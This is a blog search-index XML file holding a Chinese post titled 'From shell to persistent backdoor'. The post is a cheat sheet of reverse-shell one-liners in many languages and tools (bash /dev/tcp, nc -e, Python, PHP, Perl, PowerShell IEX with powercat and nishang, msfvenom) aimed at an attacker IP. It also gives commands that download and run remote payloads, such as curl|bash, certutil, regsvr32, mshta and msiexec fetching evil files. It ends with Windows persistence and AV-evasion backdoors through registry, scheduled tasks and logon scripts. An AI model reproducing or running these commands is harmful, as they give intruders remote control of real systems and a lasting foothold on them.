<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>从shell到持久化后门</title>
    <link href="/2020/08/21/%E4%BB%8Eshell%E5%88%B0%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8/"/>
    <url>/2020/08/21/%E4%BB%8Eshell%E5%88%B0%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="反弹shell的各种姿势"><a href="#反弹shell的各种姿势" class="headerlink" title="反弹shell的各种姿势"></a>反弹shell的各种姿势</h1><p><code>攻击者主机为：192.168.99.242，本地监听1234端口</code></p><h2 id="Linux-反弹shell"><a href="#Linux-反弹shell" class="headerlink" title="Linux 反弹shell"></a>Linux 反弹shell</h2><h3 id="姿势一：bash反弹"><a href="#姿势一：bash反弹" class="headerlink" title="姿势一：bash反弹"></a>姿势一：bash反弹</h3><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/192.168.99.242/1234 0&gt;&amp;1<span class="hljs-meta">#</span><span class="bash">base64版</span>bash -c '&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjI0Mi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html</code></pre><h4 id="其他版本："><a href="#其他版本：" class="headerlink" title="其他版本："></a>其他版本：</h4><pre><code class="hljs shell">exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5;doneexec /bin/sh 0&lt;/dev/tcp/192.168.99.242/1234 1&gt;&amp;0 2&gt;&amp;0</code></pre><h3 id="姿势二：nc反弹"><a href="#姿势二：nc反弹" class="headerlink" title="姿势二：nc反弹"></a>姿势二：nc反弹</h3><pre><code class="hljs angelscript">nc -e /bin/bash <span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> <span class="hljs-number">1234</span></code></pre><h3 id="姿势三：awk反弹"><a href="#姿势三：awk反弹" class="headerlink" title="姿势三：awk反弹"></a>姿势三：awk反弹</h3><pre><code class="hljs shell">awk 'BEGIN&#123;s="/inet/tcp/0/192.168.99.242/1234";for(;s|&amp;getlinec;close(c))while(c|getline)print|&amp;s;close(s)&#125;'</code></pre><h3 id="姿势四：telnet反弹"><a href="#姿势四：telnet反弹" class="headerlink" title="姿势四：telnet反弹"></a>姿势四：telnet反弹</h3><p>备注：需要在攻击主机上分别监听1234和4321端口，执行反弹shell命令后，在1234终端输入命令，4321查看命令执行后的结果。</p><pre><code class="hljs shell">telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321</code></pre><h3 id="姿势五：socat反弹"><a href="#姿势五：socat反弹" class="headerlink" title="姿势五：socat反弹"></a>姿势五：socat反弹</h3><pre><code class="hljs shell">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234</code></pre><h3 id="姿势六：Python反弹"><a href="#姿势六：Python反弹" class="headerlink" title="姿势六：Python反弹"></a>姿势六：Python反弹</h3><pre><code class="hljs shell">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</code></pre><h3 id="姿势七：PHP反弹"><a href="#姿势七：PHP反弹" class="headerlink" title="姿势七：PHP反弹"></a>姿势七：PHP反弹</h3><pre><code class="hljs shell">php -r '$sock=fsockopen("192.168.99.242",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre><h3 id="姿势八：Perl反弹"><a href="#姿势八：Perl反弹" class="headerlink" title="姿势八：Perl反弹"></a>姿势八：Perl反弹</h3><pre><code class="hljs shell">perl -e 'use Socket;$i="192.168.99.242";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</code></pre><h3 id="姿势九：Ruby反弹"><a href="#姿势九：Ruby反弹" class="headerlink" title="姿势九：Ruby反弹"></a>姿势九：Ruby反弹</h3><pre><code class="hljs shell">ruby -rsocket -e'f=TCPSocket.open("192.168.99.242",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</code></pre><h3 id="姿势十：Lua反弹"><a href="#姿势十：Lua反弹" class="headerlink" title="姿势十：Lua反弹"></a>姿势十：Lua反弹</h3><pre><code class="hljs shell">lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.99.242','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</code></pre><h3 id="姿势十一：JAVA反弹"><a href="#姿势十一：JAVA反弹" class="headerlink" title="姿势十一：JAVA反弹"></a>姿势十一：JAVA反弹</h3><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Revs</span> </span>&#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> args</span><span class="hljs-comment">    * <span class="hljs-doctag">@throws</span> Exception </span><span class="hljs-comment">    */</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        <span class="hljs-comment">// TODO Auto-generated method stub</span>        Runtime r = Runtime.getRuntime();        String cmd[]= &#123;<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;;        Process p = r.exec(cmd);        p.waitFor();    &#125;&#125;</code></pre><p>保存为Revs.java文件，编译执行，成功反弹shell。</p><pre><code class="hljs java">javac Revs.java java Revs</code></pre><h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="姿势一：nc反弹"><a href="#姿势一：nc反弹" class="headerlink" title="姿势一：nc反弹"></a>姿势一：nc反弹</h3><pre><code class="hljs angelscript">netcat 下载：https:<span class="hljs-comment">//eternallybored.org/misc/netcat/</span>服务端反弹：nc <span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> <span class="hljs-number">1234</span> -e c:\windows\system32\cmd.exe</code></pre><h3 id="姿势二：powershell反弹"><a href="#姿势二：powershell反弹" class="headerlink" title="姿势二：powershell反弹"></a>姿势二：powershell反弹</h3><p>powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。</p><pre><code class="hljs reasonml">PS C:\WWW&gt;powershell IEX (New-Object System.Net.Webclient).<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">besimorhino</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span>.<span class="hljs-params">ps1</span>')</span>; powercat -c <span class="hljs-number">192.168</span>.<span class="hljs-number">99.242</span> -p <span class="hljs-number">1234</span> -e cmd</code></pre><p>下载到目标机器本地执行：</p><pre><code class="hljs angelscript">PS C:\WWW&gt; Import-Module ./powercat.ps1PS C:\WWW&gt; powercat -c <span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> -p <span class="hljs-number">1234</span> -e cmd</code></pre><h3 id="姿势三：MSF反弹shell"><a href="#姿势三：MSF反弹shell" class="headerlink" title="姿势三：MSF反弹shell"></a>姿势三：MSF反弹shell</h3><p>使用msfvenom生成相关Payload</p><pre><code class="hljs routeros">msfvenom -l payloads | grep <span class="hljs-string">'cmd/windows/reverse'</span>msfvenom -p cmd/windows/reverse_powershell <span class="hljs-attribute">LHOST</span>=192.168.99.242 <span class="hljs-attribute">LPORT</span>=1234</code></pre><h3 id="姿势四：Cobalt-strike反弹shell"><a href="#姿势四：Cobalt-strike反弹shell" class="headerlink" title="姿势四：Cobalt strike反弹shell"></a>姿势四：Cobalt strike反弹shell</h3><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、配置监听器：点击Cobalt Strike——&gt;Listeners——&gt;在下方Tab菜单Listeners，点击add。<span class="hljs-number">2</span>、生成payload：点击Attacks——&gt;Packages——&gt;Windows Executable，保存文件位置。<span class="hljs-number">3</span>、目标机执行powershell payload</code></pre><h3 id="姿势五：Empire反弹shell"><a href="#姿势五：Empire反弹shell" class="headerlink" title="姿势五：Empire反弹shell"></a>姿势五：Empire反弹shell</h3><pre><code class="hljs routeros">usestager windows/launcher_vbsinfo<span class="hljs-builtin-name">set</span> Listener testexecute</code></pre><h3 id="姿势六：nishang反弹shell"><a href="#姿势六：nishang反弹shell" class="headerlink" title="姿势六：nishang反弹shell"></a>姿势六：nishang反弹shell</h3><h4 id="Reverse-TCP-shell："><a href="#Reverse-TCP-shell：" class="headerlink" title="Reverse TCP shell："></a>Reverse TCP shell：</h4><pre><code class="hljs reasonml">powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span> <span class="hljs-operator">/</span><span class="hljs-params">samratashok</span><span class="hljs-operator">/</span><span class="hljs-params">nishang</span><span class="hljs-operator">/</span>9a3c747bcf535ef82dc4c5c66aac36db47c2afde<span class="hljs-operator">/</span>Shells<span class="hljs-operator">/</span>Invoke-PowerShellTcp.<span class="hljs-params">ps1</span>')</span>; Invoke-PowerShellTcp -Reverse -IPAddress <span class="hljs-number">10.1</span>.<span class="hljs-number">1.210</span> -port <span class="hljs-number">1234</span></code></pre><h4 id="Reverse-UDP-shell："><a href="#Reverse-UDP-shell：" class="headerlink" title="Reverse UDP shell："></a>Reverse UDP shell：</h4><pre><code class="hljs reasonml">powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">samratashok</span><span class="hljs-operator">/</span><span class="hljs-params">nishang</span><span class="hljs-operator">/</span>9a3c747bcf535ef82dc4c5c66aac36db47c2afde<span class="hljs-operator">/</span>Shells<span class="hljs-operator">/</span>Invoke-PowerShellUdp.<span class="hljs-params">ps1</span>')</span>;Invoke-PowerShellUdp -Reverse -IPAddress <span class="hljs-number">10.1</span>.<span class="hljs-number">1.210</span> -port <span class="hljs-number">1234</span></code></pre><h3 id="姿势七：Dnscat反弹shell"><a href="#姿势七：Dnscat反弹shell" class="headerlink" title="姿势七：Dnscat反弹shell"></a>姿势七：Dnscat反弹shell</h3><pre><code class="hljs reasonml">github项目地址：https:<span class="hljs-comment">//github.com/iagox86/dnscat2</span>服务端：ruby dnscat2.rb --dns <span class="hljs-string">"domain=lltest.com,host=xx.xx.xx.xx"</span> --no-cache -e <span class="hljs-keyword">open</span> -e <span class="hljs-keyword">open</span> 目标主机：powershell IEX (New-Object System.Net.Webclient).<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">lukebaggett</span><span class="hljs-operator">/</span><span class="hljs-params">dnscat2</span>-<span class="hljs-params">powershell</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">dnscat2</span>.<span class="hljs-params">ps1</span>')</span>;Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx</code></pre><h1 id="通过命令下载执行恶意代码的几种姿势"><a href="#通过命令下载执行恶意代码的几种姿势" class="headerlink" title="通过命令下载执行恶意代码的几种姿势"></a>通过命令下载执行恶意代码的几种姿势</h1><p>在目标主机执行恶意代码，可以分为上传/下载并执行恶意代码和无文件远程恶意代码执行。接下来，我们来总结一下Linux和Windows中下载和执行恶意代码的一些姿势。</p><h2 id="Linux-远程恶意代码执行"><a href="#Linux-远程恶意代码执行" class="headerlink" title="Linux 远程恶意代码执行"></a>Linux 远程恶意代码执行</h2><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>以用curl的方式执行http页面上的shell脚本，无需download，在本地机器上直接执行。</p><pre><code class="hljs shell">方式1：curl -fsSL http://192.168.99.19:8080/test.sh | bash方式2：bash &lt; &lt;( curl http://192.168.99.19:8080/test.sh  )</code></pre><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p>执行wget命令远程下载恶意程序</p><pre><code class="hljs shell">方式1：wget -q -O- http://192.168.99.19:8080/test.sh | bash方式2：wget http://192.168.99.19:8080/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php</code></pre><p>url+wget合并，实现无文件远程恶意代码执行</p><pre><code class="hljs shell">bash -c '(curl -fsSL http://192.168.99.19:8080/test.sh||wget -q -O- http://192.168.99.19:8080/test.sh)|bash -sh &gt;/dev/null 2&gt;&amp;1&amp;'</code></pre><h3 id="rcp"><a href="#rcp" class="headerlink" title="rcp"></a>rcp</h3><p>rcp命令用于复制远程文件或目录</p><pre><code class="hljs gml">rcp root@<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>:./testfile testfile</code></pre><h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>scp 是 rcp 的加强版，scp 是加密的，rcp 是不加密的</p><pre><code class="hljs elixir">scp username<span class="hljs-variable">@servername</span><span class="hljs-symbol">:/path/filename</span> /tmp/local_destination</code></pre><h3 id="rsync"><a href="#rsync" class="headerlink" title="rsync"></a>rsync</h3><p>使用rsync可以进行远程同步，拉取文件到本地服务器</p><pre><code class="hljs gml">rsync -av <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>:/tmp/passwd.txt  /tmp/passwd.txt</code></pre><h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h3><p>使用sftp下载远程服务器上的文件</p><pre><code class="hljs lsl">sftp admin@<span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> &lt;&lt;<span class="hljs-literal">EOF</span>  get  /tmp/<span class="hljs-number">2.</span>txt            quit <span class="hljs-literal">EOF</span></code></pre><h2 id="Windows-远程恶意代码执行"><a href="#Windows-远程恶意代码执行" class="headerlink" title="Windows 远程恶意代码执行"></a>Windows 远程恶意代码执行</h2><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><h3 id="利用powershell远程执行ps1脚本"><a href="#利用powershell远程执行ps1脚本" class="headerlink" title="利用powershell远程执行ps1脚本"></a>利用powershell远程执行ps1脚本</h3><pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">"IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/evil.txt'))"</span></code></pre><h3 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h3><p>利用bitsadmin命令下载文件到目标机器</p><pre><code class="hljs groovy">bitsadmin <span class="hljs-regexp">/transfer n http:/</span><span class="hljs-regexp">/192.168.28.128/</span>imag/evil.txt <span class="hljs-string">d:</span>\test\<span class="hljs-number">1.</span>txt</code></pre><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><p>用于备份证书服务，一般建议下载完文件后对缓存进行删除</p><pre><code class="hljs awk"><span class="hljs-comment">#下载文件</span>certutil -urlcache -split -f http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/imag/</span>evil.txt test.php<span class="hljs-comment">#删除缓存</span>certutil -urlcache -split -f http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/imag/</span>evil.txt <span class="hljs-keyword">delete</span></code></pre><h3 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h3><p>使用rundll32.exe，可以通过mshtml.dll执行JavaScript ，依赖于WScript.shell这个组件</p><pre><code class="hljs reasonml">rundll32.exe javascript:<span class="hljs-string">"\..\mshtml,RunHTMLApplication "</span>;document.write<span class="hljs-literal">()</span>;h=<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">"WinHttp.WinHttpRequest.5.1"</span>)</span>;h.<span class="hljs-constructor">Open(<span class="hljs-string">"GET"</span>,<span class="hljs-string">"http://192.168.28.131:8888/connect"</span>,<span class="hljs-params">false</span>)</span>;<span class="hljs-keyword">try</span>&#123;h.<span class="hljs-constructor">Send()</span>;b=h.ResponseText;eval(b);&#125;catch(e)&#123;<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">"WScript.Shell"</span>)</span>.<span class="hljs-constructor">Run(<span class="hljs-string">"cmd /c taskkill /f /im rundll32.exe"</span>,0,<span class="hljs-params">true</span>)</span>;&#125;</code></pre><h3 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h3><p>远程加载执行，解析.src文件</p><pre><code class="hljs groovy">regsvr32.exe <span class="hljs-regexp">/u /</span>n <span class="hljs-regexp">/s /</span><span class="hljs-string">i:</span><span class="hljs-string">http:</span><span class="hljs-comment">//192.168.28.131:8888/file.sct scrobj.dll</span></code></pre><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>执行WMIC以下命令从远程服务器下载并运行恶意XSL文件</p><pre><code class="hljs pgsql">wmic os <span class="hljs-keyword">get</span> /<span class="hljs-keyword">FORMAT</span>:"http://192.168.28.128/evil.xsl"</code></pre><h3 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h3><p>用于安装Windows Installer安装包，可远程执行msi文件</p><pre><code class="hljs groovy">msiexec <span class="hljs-regexp">/q /</span>i <span class="hljs-string">http:</span><span class="hljs-comment">//192.168.28.128/evil.msi</span></code></pre><h3 id="IEExec"><a href="#IEExec" class="headerlink" title="IEExec"></a>IEExec</h3><p>IEexec.exe应用程序是.NET Framework附带程序，运行IEExec.exe并使用url启动其他程序</p><pre><code class="hljs taggerscript">crosoft.NET<span class="hljs-symbol">\F</span>ramework64<span class="hljs-symbol">\v</span>2.0.50727&gt;caspol.exe -s offC:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\M</span>icrosoft.NET<span class="hljs-symbol">\F</span>ramework64<span class="hljs-symbol">\v</span>2.0.50727&gt;IEExec.exe http://192.168.28.131/evil.exe</code></pre><h3 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h3><p>mshta用于执行.hta文件</p><pre><code class="hljs dockerfile">mshta http://<span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span>/<span class="hljs-keyword">run</span>.<span class="bash">hta</span></code></pre><h3 id="msxsl"><a href="#msxsl" class="headerlink" title="msxsl"></a>msxsl</h3><p>msxsl.exe是微软用于命令行下处理XSL的一个程序</p><pre><code class="hljs awk">msxsl http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/scripts/</span>demo.xml http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/scripts/</span>exec.xsl</code></pre><h3 id="pubprn-vbs"><a href="#pubprn-vbs" class="headerlink" title="pubprn.vbs"></a>pubprn.vbs</h3><p>在Windows 7以上版本存在一个名为pubprn.vbs的微软已签名WSH脚本，可以利用来解析.sct脚本</p><pre><code class="hljs taggerscript">"C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\P</span>rinting_Admin_Scripts<span class="hljs-symbol">\z</span>h-CN<span class="hljs-symbol">\p</span>ubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</code></pre><h1 id="windows中常见后门持久化姿势"><a href="#windows中常见后门持久化姿势" class="headerlink" title="windows中常见后门持久化姿势"></a>windows中常见后门持久化姿势</h1><h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><p>这个和shift后门差不多，只不过在低版本的windows中，我们可以简单地替换程序，但是在高版本的windows版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持。</p><p>“映像劫持”，也被称为”IFEO”（Image File Execution Options）</p><pre><code class="hljs gams">就是Image <span class="hljs-keyword">File</span> Execution <span class="hljs-keyword">Options</span>（其实应该称为<span class="hljs-string">"image Hijack"</span>。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local <span class="hljs-keyword">system</span>有权读写修改。PS：来自百度百科</code></pre><p>简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序</p><p>操作也很简单，在注册表的<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option</code>下添加一个项<code>sethc.exe</code>，然后在<code>sethc.exe</code>这个项中添加<code>debugger</code>键，键值为我们恶意程序的路径，如下图</p><p><img src="/img/wz/nw/n1.png" srcset="/img/loading.gif" alt="n1"></p><p>效果如下</p><p><img src="/img/wz/nw/n2.jpeg" srcset="/img/loading.gif" alt="n2"></p><h2 id="注册表自启动项"><a href="#注册表自启动项" class="headerlink" title="注册表自启动项"></a>注册表自启动项</h2><p><code>MSF</code>的<code>Persistence</code>模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：<code>Run</code>和<code>RunOnce</code>，两者的区别如下</p><ol><li>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</li><li>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</li></ol><p>常见注册表启动项键的位置：</p><p>用户级</p><pre><code class="hljs taggerscript"><span class="hljs-symbol">\H</span>KEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<span class="hljs-symbol">\H</span>KEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce</code></pre><p>系统级</p><pre><code class="hljs taggerscript"><span class="hljs-symbol">\H</span>KEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<span class="hljs-symbol">\H</span>KEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<span class="hljs-symbol">\H</span>KEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\W</span>OW6432Node<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<span class="hljs-symbol">\H</span>KEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\W</span>OW6432Node<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce</code></pre><p>修改一下：</p><p><img src="/img/wz/nw/n3.png" srcset="/img/loading.gif" alt="n3"></p><p>执行结果：</p><p><img src="/img/wz/nw/n4.gif" srcset="/img/loading.gif" alt="n4"></p><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>windows下定时任务的命令有两个分别是：<code>at</code>和<code>schtasks</code>，他们两者主要区别是<code>at</code>命令在<code>win7</code>、<code>08</code>等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而<code>schtasks</code>是将定时的任务在前台执行，下面我们逐个看看</p><p><code>at</code>的一些参数</p><pre><code class="hljs jboss-cli">AT [\\computername] time [<span class="hljs-string">/INTERACTIVE</span>]    [ <span class="hljs-string">/EVERY</span><span class="hljs-function">:date</span>[,<span class="hljs-string">...</span>] | <span class="hljs-string">/NEXT</span><span class="hljs-function">:date</span>[,<span class="hljs-string">...</span>]] <span class="hljs-string">"command"</span></code></pre><p>at的执行如下：</p><p><img src="/img/wz/nw/n5.gif" srcset="/img/loading.gif" alt="n5"></p><p><code>schtasks</code>一些参数：</p><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> TaskName <span class="hljs-string">/tr</span> TaskRun <span class="hljs-string">/sc</span> schedule [<span class="hljs-string">/mo</span> modifier] [<span class="hljs-string">/d</span> day] [<span class="hljs-string">/m</span> month[,month.<span class="hljs-string">..</span>] [<span class="hljs-string">/i</span> IdleTime] [<span class="hljs-string">/st</span> StartTime] [<span class="hljs-string">/sd</span> StartDate] [<span class="hljs-string">/ed</span> EndDate] [<span class="hljs-string">/s</span> computer [<span class="hljs-string">/u</span> [domain\]user <span class="hljs-string">/p</span> password]] [<span class="hljs-string">/ru</span> &#123;[Domain\]User | <span class="hljs-string">"System"</span>&#125; [<span class="hljs-string">/rp</span> Password]] /?</code></pre><p>schtasks的执行如下：</p><p><img src="/img/wz/nw/n6.gif" srcset="/img/loading.gif" alt="n6"></p><h2 id="用户登陆初始化"><a href="#用户登陆初始化" class="headerlink" title="用户登陆初始化"></a>用户登陆初始化</h2><p><code>Userinit</code>的作用是用户在进行登陆初始化设置时，<code>WinLogon</code>进程会执行指定的<code>login scripts</code>，所以我们可以修改它的键值来添加我们要执行的程序</p><p>注册表路径为：<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code>，我们添加一个我们启动的程序，多个程序用逗号隔开</p><p><img src="/img/wz/nw/n7.jpeg" srcset="/img/loading.gif" alt="n7"></p><p>效果如下：</p><p><img src="/img/wz/nw/n8.gif" srcset="/img/loading.gif" alt="n8"></p><h2 id="Logon-Scripts"><a href="#Logon-Scripts" class="headerlink" title="Logon Scripts"></a>Logon Scripts</h2><p><code>Logon Scripts</code>优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截</p><p>注册表路径为：<code>HKEY_CURRENT_USER\Environment</code>，创建一个键为：<code>UserInitMprLogonScript</code>，其键值为我们要启动的程序路径</p><p><img src="/img/wz/nw/n9.png" srcset="/img/loading.gif" alt="n9"></p><p>效果如下：<br><img src="/img/wz/nw/n10.gif" srcset="/img/loading.gif" alt="n10"></p><h2 id="Logon-Scripts-1"><a href="#Logon-Scripts-1" class="headerlink" title="Logon Scripts"></a>Logon Scripts</h2><p><code>Logon Scripts</code>优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截</p><p>注册表路径为：<code>HKEY_CURRENT_USER\Environment</code>，创建一个键为：<code>UserInitMprLogonScript</code>，其键值为我们要启动的程序路径</p><p><img src="/img/wz/nw/n11.png" srcset="/img/loading.gif" alt="n11"></p><p>效果如下：<br><img src="/img/wz/nw/n12.gif" srcset="/img/loading.gif" alt="n12"></p><h2 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h2><p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的<br>其中屏幕保护的配置存储在注册表中，其位置为：<code>HKEY_CURRENT_USER\Control Panel\Desktop</code>，关键键值如下：</p><ol><li><code>SCRNSAVE.EXE</code> - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序</li><li><code>ScreenSaveActive</code> - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态</li><li><code>ScreenSaverTimeout</code> - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）</li></ol><p>设置如下：<br><img src="/img/wz/nw/n13.png" srcset="/img/loading.gif" alt="n13"></p><p>效果图：</p><p><img src="/img/wz/nw/n14.jpeg" srcset="/img/loading.gif" alt="n14"></p><h2 id="自启动服务"><a href="#自启动服务" class="headerlink" 